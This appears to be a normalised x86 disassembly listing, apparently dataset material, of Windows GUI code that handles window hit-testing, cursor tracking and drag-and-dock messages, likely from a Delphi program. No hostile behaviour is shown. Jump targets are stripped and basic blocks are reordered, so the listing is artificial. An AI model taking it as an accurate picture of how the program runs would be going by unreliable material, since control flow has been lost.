jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_434ccc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43511c
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_434238
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_43db40
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_43db40
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43db40
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403430
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_434c60
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_43db40
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_43db40
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_434e64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_43db40
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43db40
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_434ea8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4346c0
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_434ccc
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_413840
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_43db40
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_434e64
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403430
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43c670
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_434630
sub_435004
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_41389c
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_413730
mov edx edi
mov eax [ rw-data ]
call sub_4136e4
jmp r-xdata
sub_435064
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_4350bc
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40442c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_434204
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_43511c
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4350bc
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_435148
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_434ea8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43511c
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_435064
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_43db40
mov [ esi ] eax
sub_435198
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_435064
cmp eax 0x1
sbb eax eax
inc eax
sub_4351d4
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_43c5dc
test eax eax
je r-xdata
mov eax esi
call sub_43c5dc
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_435c04
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_413840
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41389c
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_43c5f0
mov edi eax
jmp r-xdata
sub_435268
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_435148
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43f600
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_435198
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_435198
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_436e9c
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_435198
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454dc0
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_43f5e8
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_4351d4
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403430
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_43f6e8
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_43f600
jmp r-xdata
mov eax [ rw-data ]
call sub_43f75c
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454dc0
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_436e9c
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403430
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403430
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407ad4
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_435538
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_434764
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43f600
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_435268
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_4356a8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43584d
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403430
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403430
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434a6c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_435538
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434954
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_43db40
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_4123e4
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_436e70
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_4123e4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43586c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403430
mov ebx eax
sub_4358e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4347ac
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e4
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43586c
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_435198
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_43f75c
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435b41
mov eax [ rw-data ]
call sub_403234
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44e0b4
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_43850c
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_435064
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_451d20
sub_435b41
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4033c0
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
sub_435bd0
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_434238
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_435c04
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_435bd0
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_436e9c
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_43b42c
test eax eax
je r-xdata
mov esi eax
sub_435c4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_4136e4
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx ] eax
sub_435c74
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_413984
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403234
xor eax eax
mov [ ebx ] eax
sub_435c94
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_435cc4
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_413bac
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c10
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_435f00
call sub_403a54
call sub_403a54
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413840
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41d058
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_435d80
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413bac
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435e25
mov eax [ rw-data ]
call sub_413c10
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
